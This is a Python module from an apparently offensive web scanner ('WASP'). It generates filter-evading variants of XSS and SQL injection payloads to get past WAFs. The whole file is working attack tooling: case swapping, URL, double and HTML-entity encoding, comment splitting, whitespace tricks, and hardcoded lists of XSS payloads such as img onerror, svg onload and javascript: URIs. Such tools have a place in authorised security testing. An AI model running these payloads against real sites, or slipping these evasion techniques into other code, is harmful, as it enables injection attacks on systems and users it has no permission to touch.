# scanner/mutator.py
"""
WASP Payload Mutation Engine — Phase 2
Generates mutated variants of payloads to bypass WAF filters.

Mutation techniques:
  1. Case variation      — <ScRiPt> bypasses case-sensitive filters
  2. URL encoding        — %3Cscript%3E bypasses basic string filters
  3. HTML entity encoding — &#60;script&#62; bypasses HTML filters
  4. Comment insertion   — <scr/**/ipt> bypasses keyword filters
  5. Double encoding     — %253Cscript bypasses double-decode filters
  6. Event handler alts  — many ways to trigger JS without <script>
  7. Whitespace tricks   — tab/newline instead of space for SQLi
  8. SQLi comment alts   — # instead of -- for MySQL
"""

import urllib.parse
from core.logger import get_logger

log = get_logger(__name__)


class PayloadMutator:
    """
    Takes a base payload and generates multiple bypass variants.
    Used by SQLi and XSS scanners to increase detection rate
    against targets with basic WAF or input filters.
    """

    # ── Public API ────────────────────────────────────────────────────────────

    def mutate_xss(self, payload: str) -> list[str]:
        """
        Generate XSS bypass variants from a base payload.
        Returns deduplicated list including the original.
        """
        variants = [payload]
        variants += self._xss_case_mutations(payload)
        variants += self._xss_encoding_mutations(payload)
        variants += self._xss_comment_mutations(payload)
        variants += self._xss_attribute_mutations()
        variants += self._xss_event_handler_mutations()
        return list(dict.fromkeys(variants))  # deduplicate, preserve order

    def mutate_sqli(self, payload: str) -> list[str]:
        """
        Generate SQLi bypass variants from a base payload.
        Returns deduplicated list including the original.
        """
        variants = [payload]
        variants += self._sqli_comment_mutations(payload)
        variants += self._sqli_case_mutations(payload)
        variants += self._sqli_encoding_mutations(payload)
        variants += self._sqli_whitespace_mutations(payload)
        return list(dict.fromkeys(variants))

    # ── XSS mutation techniques ───────────────────────────────────────────────

    def _xss_case_mutations(self, payload: str) -> list[str]:
        """
        Mix upper and lowercase letters to bypass
        case-sensitive keyword filters.
        e.g. <ScRiPt> passes filters looking for <script>
        """
        return [
            payload.upper(),
            payload.lower(),
            payload.swapcase(),
            payload.replace("<script>",  "<ScRiPt>")
                   .replace("</script>", "</ScRiPt>"),
            payload.replace("<script>",  "<SCRIPT>")
                   .replace("</script>", "</SCRIPT>"),
            payload.replace("alert",     "Alert"),
            payload.replace("alert",     "ALERT"),
        ]

    def _xss_encoding_mutations(self, payload: str) -> list[str]:
        """
        Encode the payload in various ways.
        Bypasses filters that check for raw < > characters.
        """
        variants = []

        # Standard URL encoding — %3Cscript%3E
        variants.append(urllib.parse.quote(payload))

        # Double URL encoding — %253Cscript%253E
        variants.append(urllib.parse.quote(urllib.parse.quote(payload)))

        # HTML entity encoding with decimal — &#60;script&#62;
        variants.append(
            payload.replace("<", "&#60;").replace(">", "&#62;")
        )

        # HTML entity encoding with hex — &#x3C;script&#x3E;
        variants.append(
            payload.replace("<", "&#x3C;").replace(">", "&#x3E;")
        )

        # Encode just the angle brackets with URL encoding
        variants.append(
            payload.replace("<", "%3C").replace(">", "%3E")
        )

        return variants

    def _xss_comment_mutations(self, payload: str) -> list[str]:
        """
        Insert comments inside keywords to break up
        strings that filters search for literally.
        e.g. <scr<!---->ipt> still executes in many browsers
        """
        return [
            payload.replace("<script>", "<scr<!---->ipt>"),
            payload.replace("<script>", "<scr/**/ipt>"),
            payload.replace("alert(",   "al&#101;rt("),
            payload.replace("alert(",   "al\u0065rt("),
            payload.replace("<script>", "<script >"),      # trailing space
            payload.replace("<script>", "<script\t>"),     # tab inside tag
            payload.replace("<script>", "<script\n>"),     # newline inside tag
        ]

    def _xss_attribute_mutations(self) -> list[str]:
        """
        Use HTML attributes to trigger XSS without
        a <script> tag — bypasses script-tag-specific filters.
        """
        return [
            '<img src=x onerror=alert(1)>',
            '<img src=x onerror=alert`1`>',
            '<img src=x onerror="alert(1)">',
            "<img src=x onerror='alert(1)'>",
            '<svg/onload=alert(1)>',
            '<svg onload=alert(1)>',
            '<svg/onload=alert`1`>',
            '<iframe src="javascript:alert(1)">',
            '<object data="javascript:alert(1)">',
            '<embed src="javascript:alert(1)">',
            '"><img src=x onerror=alert(1)>',
            "'><img src=x onerror=alert(1)>",
            '<div style="width:expression(alert(1))">',  # IE-only
        ]

    def _xss_event_handler_mutations(self) -> list[str]:
        """
        Various HTML event handlers that trigger JavaScript.
        Different handlers work in different contexts.
        """
        return [
            '<body onload=alert(1)>',
            '<body onpageshow=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '<input onblur=alert(1) autofocus><input autofocus>',
            '<select onfocus=alert(1) autofocus>',
            '<textarea onfocus=alert(1) autofocus>',
            '<video><source onerror=alert(1)>',
            '<audio src=x onerror=alert(1)>',
            '<details open ontoggle=alert(1)>',
            '<marquee onstart=alert(1)>',
            '<a href="javascript:alert(1)">click</a>',
            '<form><button formaction=javascript:alert(1)>click',
        ]

    # ── SQLi mutation techniques ──────────────────────────────────────────────

    def _sqli_comment_mutations(self, payload: str) -> list[str]:
        """
        Replace spaces and comment styles with alternatives.
        MySQL uses # as comment, MSSQL uses --
        """
        return [
            payload.replace(" ",  "/**/"),      # comment-based space
            payload.replace(" ",  "%20"),        # URL encoded space
            payload.replace(" ",  "+"),          # plus as space
            payload.replace(" ",  "\t"),         # tab as space
            payload.replace("--", "#"),          # MySQL comment style
            payload.replace("--", "-- -"),       # comment with trailing space
            payload.replace("--", "/*"),         # block comment
            payload.replace("'",  "''"),         # escaped quote
            payload + " -- ",                    # add trailing comment
            payload + " #",                      # MySQL trailing comment
        ]

    def _sqli_case_mutations(self, payload: str) -> list[str]:
        """
        Mix SQL keyword casing to bypass
        case-sensitive keyword filters.
        """
        return [
            payload.upper(),
            payload.lower(),
            payload.replace("SELECT", "SeLeCt")
                   .replace("UNION",  "UnIoN")
                   .replace("FROM",   "FrOm")
                   .replace("WHERE",  "WhErE"),
            payload.replace("OR",  "Or")
                   .replace("AND", "AnD")
                   .replace("NOT", "NoT"),
            payload.replace("sleep", "Sleep")
                   .replace("SLEEP", "SlEeP"),
        ]

    def _sqli_encoding_mutations(self, payload: str) -> list[str]:
        """
        URL-encode the SQLi payload or parts of it.
        Bypasses filters that decode only once.
        """
        return [
            urllib.parse.quote(payload),
            payload.replace("'",  "%27"),
            payload.replace(" ",  "%20").replace("'", "%27"),
            payload.replace("=",  "%3D"),
        ]

    def _sqli_whitespace_mutations(self, payload: str) -> list[str]:
        """
        Replace spaces with alternative whitespace characters.
        Some filters only strip regular spaces.
        """
        return [
            payload.replace(" ", "\n"),       # newline
            payload.replace(" ", "\r\n"),     # carriage return + newline
            payload.replace(" ", "  "),       # double space
            payload.replace(" ", "\x0b"),     # vertical tab
            payload.replace(" ", "\x0c"),     # form feed
        ]